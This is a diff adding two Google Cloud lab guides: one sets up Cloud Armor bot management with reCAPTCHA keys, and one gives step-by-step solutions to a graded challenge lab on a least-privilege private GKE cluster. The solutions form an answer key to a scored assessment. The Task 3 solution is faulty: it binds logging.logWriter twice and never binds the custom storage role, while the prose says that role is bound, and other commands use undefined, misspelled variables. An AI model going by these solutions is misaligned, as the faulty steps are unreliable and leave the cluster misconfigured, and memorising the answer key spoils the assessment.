+**Note:** It might take up to 5 minutes to access the HTTP Load Balancer. In the meantime, you might get a 404 or 502 error. Keep trying until you see the page load.
+
+### Task 4. Create and deploy reCAPTCHA session token and challenge-page site key
+
+reCAPTCHA Enterprise for WAF and Google Cloud Armor integration offers the following features: [reCAPTCHA challenge page](https://cloud.google.com/recaptcha-enterprise/docs/usecase#redirect), [reCAPTCHA action-tokens](https://cloud.google.com/recaptcha-enterprise/docs/usecase#action-token), and [reCAPTCHA session-tokens](https://cloud.google.com/recaptcha-enterprise/docs/usecase#session-token). In this task, you implement the reCATCHA session token site key and reCAPTCHA WAF challenge-page site.
+
+#### Create reCAPTCHA session token and WAF challenge-page site key
+
+Before you create the session token site key and challenge page site key, double-check that you've enabled the reCAPTCHA Enterprise API as indicated in the previous *Enable API* section.
+
+The reCAPTCHA JavaScript sets a reCAPTCHA session-token as a cookie on the end-user's browser after the assessment. The end-user's browser attaches the cookie and refreshes the cookie as long as the reCAPTCHA JavaScript remains active.
+
+1. Create the reCAPTCHA session token site key and enable the WAF feature for the key:
+
+```
+gcloud recaptcha keys create --display-name=test-key-name \
+  --web --allow-all-domains --integration-type=score --testing-score=0.5 \
+  --waf-feature=session-token --waf-service=ca
+```
+
+Copied!
+
+The output of the above command gives you the session token site key you created. Record it to use later in this task.
+
+You also set the WAF service to Cloud Armor to enable the Cloud Armor integration.
+
+**Note:** You are using the integration type **score** which is leveraged in the Cloud Armor policy. You can alternatively use **checkbox** and **invisible**.
+
+
+
+You also set a **testing score** when you create the key to validate that the bot management policies created with Cloud Armor are working as intended. Replicating bot traffic is not easy, so this is a good way to test the feature.
+
+1. Create the reCAPTCHA WAF challenge-page site key and enable the WAF feature for the key. You can use the reCAPTCHA challenge page feature to redirect incoming requests to reCAPTCHA Enterprise to determine whether each request is potentially fraudulent or legitimate. Later, you associate this key with the Cloud Armor security policy to enable the manual challenge. This lab refers to this key as `CHALLENGE-PAGE-KEY` in the later steps.
+
+```
+gcloud recaptcha keys create --display-name=challenge-page-key \
+--web --allow-all-domains --integration-type=INVISIBLE \
+--waf-feature=challenge-page --waf-service=ca
+```
+
+Copied!
+
+1. Navigate to **Navigation menu (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)) > Security > reCAPTCHA Enterprise**. You should see the keys you created in the **Enterprise Keys** list:
+
+#### Implement reCAPTCHA session token site key
+
+1. Navigate to **Navigation menu (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)) > Compute Engine > VM Instances**. Locate the VM in your instance group and SSH to it.
+
+![The highlighted SSH within the Connect column](images/AQj28q12uBrWsd0n8zV4%2Bo%2F8piYYiQVwiSotUEYiNGE%3D.png)
+
+1. Go to the webserver root directory and change user to root:
+
+```
+cd /var/www/html/
+sudo su
+```
+
+Copied!
+
+1. Update the landing `index.html` page and embed the reCAPTCHA session token site key. The session token site key (that you recorded earlier) is set in the head section of your landing page as below:
+
+```
+src="https://www.google.com/recaptcha/enterprise.js?render=<SESSION_TOKEN_SITE_KEY>&waf=session" async defer>
+```
+
+Remember to replace `<SESSION_TOKEN_SITE_KEY>` with the site token before you run the following command:
+
+```
+echo '<!doctype html><html><head><title>ReCAPTCHA Session Token</title><script src="https://www.google.com/recaptcha/enterprise.js?render=<SESSION_TOKEN_SITE_KEY>&waf=session" async defer></script></head><body><h1>Main Page</h1><p><a href="/good-score.html">Visit allowed link</a></p><p><a href="/bad-score.html">Visit blocked link</a></p><p><a href="/median-score.html">Visit redirect link</a></p></body></html>' > index.html
+```
+
+Copied!
+
+1. Create three other sample pages to test out the bot management policies:
+
+- **good-score.html**
+
+```
+echo '<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"></head><body><h1>Congrats! You have a good score!!</h1></body></html>' > good-score.html
+```
+
+Copied!
+
+- **bad-score.html**
+
+```
+echo '<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"></head><body><h1>Sorry, You have a bad score!</h1></body></html>' > bad-score.html
+```
+
+Copied!
+
+- **median-score.html**
+
+```
+echo '<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"></head><body><h1>You have a median score that we need a second verification.</h1></body></html>' > median-score.html
+```
+
+Copied!
+
+Validate that you are able to access all the webpages by opening them in your browser. Be sure to replace `[LB_IP_v4]` with the IPv4 address of the load balancer:
+
+1. Open `http://[LB_IP_v4]/index.html`. You verify that the reCAPTCHA implementation is working when you see "protected by reCAPTCHA" at the bottom right corner of the page:
+
+![Reptcha logo](images/hijCD02uC9m6FzFygoYmmJeU8b06l3oLtlfyUDXmnF4%3D.png)
+
+1. Click into each of the links.
+
+![The Main Page within the browser, which includes three links](images/d%2B8kqWJEyfY1srSw17QjZmrvHufNUR%2FLFyigfgO6afQ%3D.png)
+
+1. Validate you are able to access all the pages.
+
+![The message: Congrats! You have a good score!](images/riGt21Sk4umYJFO84160eIeMSblu5VKRYsto%2FA06nsc%3D.png)
+
+Click **Check my progress** to verify the objective.
+
+Deploy reCAPTCHA session token and challenge-page site key
+
+
+
+Check my progress
+
+
+
+### Task 5. Create Cloud Armor security policy rules for Bot Management
+
+In this section, you use Cloud Armor bot management rules to allow, deny and redirect requests based on the reCAPTCHA score.
+
+1. In Cloud Shell, create security policy via gcloud:
+
+```
+gcloud compute security-policies create recaptcha-policy \
+    --description "policy for bot management"
+```
+
+Copied!
+
+1. To use reCAPTCHA Enterprise manual challenge to distinguish between human and automated clients, associate the reCAPTCHA WAF challenge site key (CHALLENGE-PAGE-KEY) you previously created for a manual challenge with the security policy. In the following script, remember to replace "CHALLENGE-PAGE-KEY" with the key you previously created:
+
+```
+gcloud compute security-policies update recaptcha-policy \
+  --recaptcha-redirect-site-key "CHALLENGE-PAGE-KEY"
+```
+
+Copied!
+
+1. Add a bot management rule to allow traffic if the url path matches good-score.html and has a score greater than 0.4:
+
+```
+gcloud compute security-policies rules create 2000 \
+    --security-policy recaptcha-policy\
+    --expression "request.path.matches('good-score.html') &&    token.recaptcha_session.score > 0.4"\
+    --action allow
+```
+
+Copied!
+
+1. Add a bot management rule to deny traffic if the url path matches bad-score.html and has a score less than 0.6:
+
+```
+gcloud compute security-policies rules create 3000 \
+    --security-policy recaptcha-policy\
+    --expression "request.path.matches('bad-score.html') && token.recaptcha_session.score < 0.6"\
+    --action "deny-403"
+```
+
+Copied!
+
+1. Add a bot management rule to redirect traffic to Google reCAPTCHA if the url path matches median-score.html and has a score equal to 0.5:
+
+```
+gcloud compute security-policies rules create 1000 \
+    --security-policy recaptcha-policy\
+    --expression "request.path.matches('median-score.html') && token.recaptcha_session.score == 0.5"\
+    --action redirect \
+    --redirect-type google-recaptcha
+```
+
+Copied!
+
+1. Attach the security policy to the backend service `http-backend`:
+
+```
+gcloud compute backend-services update http-backend \
+    --security-policy recaptcha-policy --global
+```
+
+Copied!
+
+1. In the console, navigate to **Navigation menu > Network Security > Cloud Armor policies**.
+2. Click `recaptcha-policy`.
+
+Your policy should resemble the following:
+
+![Rules tabbed page, which lists several actions and their priority](https://cdn.qwiklabs.com/MUo8wSm0AeKcnKWcTUGeKggj%2BMTo7zMfpjCvk4qh52c%3D)
+
+Click **Check my progress** to verify the objective.
+
+Create Cloud Armor security policy rules for Bot Management
+
+
+
+Check my progress
+
+
+
+### Task 6. Validate Bot Management with Cloud Armor
+
+1. Open up a browser and enter the url `http://[LB_IP_v4]/index.html`. Navigate to **"Visit allowed link"**.
+
+![The good-score web page, which displays the text 'Congrats! You have a good score!'](images/P1Pds%2BhAsOsycMJebzf42l9VHjvuaPQfP83bHWDGzTQ%3D.png)
+
+1. Open a new window in Incognito mode to ensure you have a new session.
+2. Enter the url `http://[LB_IP_v4]/index.html` and navigate to **"Visit blocked link"**. You should receive a **HTTP 403** error:
+
+![The error message '403 Forbidden'](images/9i7F%2FqK%2BZGRx7uygrWvBfAASRtqCrheiudDynmPZNas%3D.png)
+
+1. Open a new window in Incognito mode to ensure you have a new session.
+2. Enter the url `http://[LB_IP_v4]/index.html` and navigate to **"Visit redirect link"**. You should see the redirection to Google reCAPTCHA and the manual challenge page as below:
+
+![Google reCAPTCHA dialog](images/yAOj0fZVtc1LUyQgrla3AJj1ukhDVXERnQ%2FPwAULteA%3D.png)
+
+**Note:** If the user interaction passes the assessment, reCAPTCHA Enterprise issues an exemption cookie. The browser attaches this exemption cookie to the user's subsequent requests to the same site until the cookie expires. By default, the exemption cookie expires after three hours.
+
+**Note:** To prevent automated software from participating in abusive actions on your site, reCAPTCHA uses an advanced risk analysis engine and adaptive CAPTCHAs. It accomplishes this while allowing your valid users to pass through with ease. If the algorithm believes you are a human, it will validate the reCaptcha without additional action from you. If not, it will display a variety of images that you must categorize before proceeding. Only the most suspect traffic will be requested to solve a captcha by default. If you are not served with a challenge to solve, you can still check the policy logs and verify that you were exempted from solving a challenge.
+
+#### Verify Cloud Armor logs
+
+Explore the security policy logs to validate bot management worked as expected.
+
+1. In the console, navigate to **Navigation menu > Network Security > Cloud Armor**.
+2. Click **recaptcha-policy**.
+3. Click **Logs**.
+4. Click **View policy logs**.
+5. Below is the MQL(monitoring query language) query, copy and paste into the query editor:
+
+```
+resource.type:(http_load_balancer) AND jsonPayload.enforcedSecurityPolicy.name:(recaptcha-policy)
+```
+
+Copied!
+
+1. Now click **Run Query**.
+2. Look for a log entry in Query results where the request is for `http://[LB_IP_v4]/good-score.html`. Expand jsonPayload.Expand enforcedSecurityPolicy.
+
+![The expanded jsonPayload.Expand enforcedSecurityPolicy and highlighted html](images/%2B%2F23uHRDBxuG1FsCvn4FnsgdACURikUnexbEqfyzk%2FM%3D.png)
+
+**Note:** If you are not seeing log entries, wait a couple of minutes for the policy to propagate, refresh the URLs you used earlier, then check the logs again.
+
+1. Repeat the same for `http://[LB_IP_v4]/bad-score.html` and `http://[LB_IP_v4]/median-score.html`.
+
+![The expanded security policy and request data for the bad-score link](images/hUuMWSm6%2Fzp5JgNQCjayWprE6pnDkmz4Zj5%2B99lUSGs%3D.png)
+
+![The expanded security policy and request data for the median-score link](images/652z3yZfcsUfKGsUkhtTPEtD3AVDVpcxNWYlgbHhDWE%3D.png)
+
+Notice that the `configuredAction` is set to **ALLOW, DENY or GOOGLE_RECAPTCHA** with the name **recaptcha-policy**.
+
+**Note:** Cloud Armor security policies create logs that can be explored to determine when traffic is denied and when it is allowed, along with the source of the traffic.
+
+Click **Check my progress** to verify the objective.
+
+Validate bot management with Cloud Armor
+
+
+
+Check my progress
+
+
+
+### Congratulations!
+
+You successfully implemented bot management with Cloud Armor. You configured an HTTP Load Balancer. Then, you created and implemented reCAPTCHA session token site key on a webpage. You also created a challenge-page site key. You set up Cloud Armor Bot management policy and validated how they handle requests based on the rules. You explored the security policy logs to identify why the traffic was allowed, blocked or redirected.
+
+
+
+
+
+
+
+# Implement Cloud Security Fundamentals on Google Cloud
+
+
+
+## Implement Cloud Security Fundamentals on Google Cloud: Challenge Lab
+
+### Overview
+
+In a challenge lab you’re given a scenario and a set of tasks. Instead of following step-by-step instructions, you will use the skills learned from the labs in the course to figure out how to complete the tasks on your own! An automated scoring system (shown on this page) will provide feedback on whether you have completed your tasks correctly.
+
+When you take a challenge lab, you will not be taught new Google Cloud concepts. You are expected to extend your learned skills, like changing default values and reading and researching error messages to fix your own mistakes.
+
+To score 100% you must successfully complete all tasks within the time period!
+
+This lab is recommended for students who have enrolled in the [Implement Cloud Security Fundamentals on Google Cloud](https://www.cloudskillsboost.google/course_templates/645) skill badge. Are you ready for the challenge?
+
+#### Topics tested
+
+- Create a custom security role.
+- Create a service account.
+- Bind IAM security roles to a service account.
+- Create a private Kubernetes Engine cluster in a custom subnet.
+- Deploy an application to a private Kubernetes Engine cluster
+
+### Setup and requirements
+
+#### Before you click the Start Lab button
+
+Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click **Start Lab**, shows how long Google Cloud resources are made available to you.
+
+This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.
+
+To complete this lab, you need:
+
+- Access to a standard internet browser (Chrome browser recommended).
+
+**Note:** Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.
+
+- Time to complete the lab—remember, once you start, you cannot pause a lab.
+
+**Note:** Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.
+
+### Challenge scenario
+
+You have started a new role as a junior member of the security team for the Orca team in Jooli Inc. Your team is responsible for ensuring the security of the Cloud infrastructure and services that the company's applications depend on.
+
+You are expected to have the skills and knowledge for these tasks, so don't expect step-by-step guides to be provided.
+
+#### Your challenge
+
+You have been asked to deploy, configure, and test a new Kubernetes Engine cluster that will be used for application development and pipeline testing by the Orca development team.
+
+As per the organization's security standards you must ensure that the new Kubernetes Engine cluster is built according to the organization's most recent security standards and thereby must comply with the following:
+
+- The cluster must be deployed using a dedicated service account configured with the least privileges required.
+- The cluster must be deployed as a Kubernetes Engine private cluster, with the public endpoint disabled, and the master authorized network set to include only the ip-address of the Orca group's management jumphost.
+- The Kubernetes Engine private cluster must be deployed to the `orca-build-subnet` in the Orca Build VPC.
+
+From a previous project you know that the minimum permissions required by the service account that is specified for a Kubernetes Engine cluster is covered by these three built in roles:
+
+- `roles/monitoring.viewer`
+- `roles/monitoring.metricWriter`
+- `roles/logging.logWriter`
+
+These roles are specified in the Google Kubernetes Engine (GKE)'s Harden your cluster's security guide in the [Use least privilege Google service accounts](https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#use_least_privilege_sa) section.
+
+You must bind the above roles to the service account used by the cluster as well as a custom role that you must create in order to provide access to any other services specified by the development team. Initially you have been told that the development team requires that the service account used by the cluster should have the permissions necessary to add and update objects in Google Cloud Storage buckets. To do this you will have to create a new custom IAM role that will provide the following permissions:
+
+- `storage.buckets.get`
+- `storage.objects.get`
+- `storage.objects.list`
+- `storage.objects.update`
+- `storage.objects.create`
+
+Once you have created the new private cluster you must test that it is correctly configured by connecting to it from the jumphost, `orca-jumphost`, in the management subnet `orca-mgmt-subnet`. As this compute instance is not in the same subnet as the private cluster you must make sure that the master authorized networks for the cluster includes the internal ip-address for the instance, and you must specify the `--internal-ip` flag when retrieving cluster credentials using the `gcloud container clusters get-credentials` command.
+
+All new cloud objects and services that you create should include the "orca-" prefix.
+
+Your final task is to validate that the cluster is working correctly by deploying a simple application to the cluster to test that management access to the cluster using the `kubectl` tool is working from the `orca-jumphost` compute instance.
+
+For all tasks in this lab, use the `europe-west4` region and the `europe-west4-b` zone.
+
+### Task 1. Create a custom security role
+
+Your first task is to create a new custom IAM security role called `orca_storage_editor_401` that will provide the Google Cloud storage bucket and object permissions required to be able to create and update storage objects.
+
+#### Solution
+
+**Create a Role Definition File**:
+
+```
+cat > role-definition.yaml <<EOF_END
+title: "$CUSTOM_SECURIY_ROLE"
+description: "Permissions"
+stage: "ALPHA"
+includedPermissions:
+- storage.buckets.get
+- storage.objects.get
+- storage.objects.list
+- storage.objects.update
+- storage.objects.create
+EOF_END
+```
+
+Here, we create a YAML file that defines the custom IAM role. This file specifies the title, description, stage, and included permissions for the role.
+
+**Create the Custom Security Role**:
+
+```
+gcloud iam roles create $CUSTOM_SECURIY_ROLE --project $DEVSHELL_PROJECT_ID --file role-definition.yaml
+```
+
+Assessment Completed!
+
+Check that a Custom security role has been created.
+
+
+
+Check my progress
+
+*Assessment Completed!*
+
+
+
+
+
+### Task 2. Create a service account
+
+Your second task is to create the dedicated service account that will be used as the service account for your new private cluster. You must name this account `orca-private-cluster-523-sa`.
+
+#### Solution
+
+```
+gcloud iam service-accounts create orca-private-cluster-523-sa --display-name "Orca Private Cluster Service Account"
+```
+
+Check that a new service account has been created.
+
+
+
+Check my progress
+
+
+
+### Task 3. Bind a custom security role to a service account
+
+You must now bind the Cloud Operations logging and monitoring roles that are required for Kubernetes Engine Cluster service accounts as well as the custom IAM role you created for storage permissions to the Service Account you created earlier.
+
+#### Solution 
+
+**Bind IAM Policy Roles:**
+
+```
+gcloud projects add-iam-policy-binding qwiklabs-gcp-02-7589d0814713 --member serviceAccount:orca-private-cluster-523-sa@qwiklabs-gcp-02-7589d0814713.iam.gserviceaccount.com --role roles/monitoring.viewer
+
+gcloud projects add-iam-policy-binding qwiklabs-gcp-02-7589d0814713 --member serviceAccount:orca-private-cluster-523-sa@qwiklabs-gcp-02-7589d0814713.iam.gserviceaccount.com --role roles/monitoring.metricWriter
+
+gcloud projects add-iam-policy-binding qwiklabs-gcp-02-7589d0814713 --member serviceAccount:orca-private-cluster-523-sa@qwiklabs-gcp-02-7589d0814713.iam.gserviceaccount.com --role roles/logging.logWriter
+
+gcloud projects add-iam-policy-binding qwiklabs-gcp-02-7589d0814713 --member serviceAccount:orca-private-cluster-523-sa@qwiklabs-gcp-02-7589d0814713.iam.gserviceaccount.com --role roles/logging.logWriter
+```
+
+These commands bind various IAM roles to the service account. The roles `monitoring.viewer`, `monitoring.metricWriter`, and `logging.logWriter` provide monitoring and logging capabilities. The custom role created in Task 1 is also bound to the service account.
+
+Check that a the correct built in and custom security roles have been bound to the new service account.
+
+
+
+Check my progress
+
+
+
+### Task 4. Create and configure a new Kubernetes Engine private cluster
+
+You must now use the service account you have configured when creating a new Kubernetes Engine private cluster. The new cluster configuration must include the following:
+
+- The cluster must be called `orca-cluster-455`
+- The cluster must be deployed to the subnet `orca-build-subnet`
+- The cluster must be configured to use the `orca-private-cluster-523-sa` service account.
+- The private cluster options `enable-master-authorized-networks`, `enable-ip-alias`, `enable-private-nodes`, and `enable-private-endpoint` must be enabled.
+
+Once the cluster is configured you must add the internal ip-address of the `orca-jumphost` compute instance to the master authorized network list.
+
+**Create the GKE Cluster**:
+
+```
+gcloud container clusters create $CLUSTER_NAME --num-nodes 1 --master-ipv4-cidr=172.16.0.64/28 --network orca-build-vpc --subnetwork orca-build-subnet --enable-master-authorized-networks --master-authorized-networks 192.168.10.2/32 --enable-ip-alias --enable-private-nodes --enable-private-endpoint --service-account $SERVICE_ACCOUNT@$DEVSHELL_PROJECT_ID.iam.gserviceaccount.com --zone $ZONE
+```
+
+This command creates a private Google Kubernetes Engine (GKE) cluster. Key configurations include enabling private nodes and endpoints, setting master authorized networks, and specifying the service account for the cluster.
+
+Confirm that a Kubernetes Engine private cluster has been deployed correctly.
+
+
+
+Check my progress
+
+
+
+### Task 5. Deploy an application to a private Kubernetes Engine cluster
+
+You have a simple test application that can be deployed to any cluster to quickly test that basic container deployment functionality is working and that basic services can be created and accessed. You must configure the environment so that you can deploy this simple demo to the new cluster using the jumphost `orca-jumphost`.
+
+**Note:** Make sure to properly install the `gke-gcloud-auth-plugin` before running any `kubectl` commands. This is detailed below in **Tip 1**.
+
+```
+kubectl create deployment hello-server --image=gcr.io/google-samples/hello-app:1.0
+```
+
+
+
+This deploys an application that listens on port 8080 that can be exposed using a basic load balancer service for testing.
+
+#### Solution
+
+**Connect to the orca-jumphost VM**
+
+```
+gcloud compute ssh --zone "$ZONE" "orca-jumphost" --project qwiklabs-gcp-02-7589d0814713 
+```
+
+**Run this command to orca-jumphost VM**
+
+```
+gcloud config set compute/zone europe-west4-b 
+
+gcloud container clusters get-credentials orca-cluster-455 --project qwiklabs-gcp-02-7589d0814713 --internal-ip --location europe-west4
+
+sudo apt-get install google-cloud-sdk-gke-gcloud-auth-plugin
+
+kubectl create deployment hello-server --image=gcr.io/google-samples/hello-app:1.0
+```
+
+
+
+Check that an application has been deployed to a private Kubernetes Engine cluster.
+
+
+
+Check my progress
+
+
+
+### Congratulations!
+
+In this lab, you have configured a new Kubernetes Engine private cluster that is configured to use a dedicated service account with the least privileges required to run the cluster. You have also created a custom IAM role that provides the permissions required to create and update storage objects in Google Cloud Storage buckets and bound that role to the service account used by the cluster. You also validated that the cluster is working correctly by deploying a simple application to the cluster to test that management access to the cluster using the `kubectl` tool is working from the `orca-jumphost` compute instance.
+
+![Implement Cloud Security Fundamentals on Google Cloud badge](images/LJBXHCk%2FXoRpaS5OxvXGPf3kIqERA7gTiNnmrpa2wzQ%3D.png)
+
+
+
+
+
+
+
+
+
